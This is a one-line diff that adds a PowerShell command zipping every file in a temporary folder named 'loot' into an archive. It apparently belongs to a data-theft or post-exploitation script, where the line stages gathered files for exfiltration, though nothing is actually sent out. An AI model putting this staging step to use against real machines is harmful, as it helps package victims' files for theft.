@@ -1,0 +1,1 @@
+Compress-Archive -Path $env:temp\loot\*.* -DestinationPath $env:temp\loot\files.zip
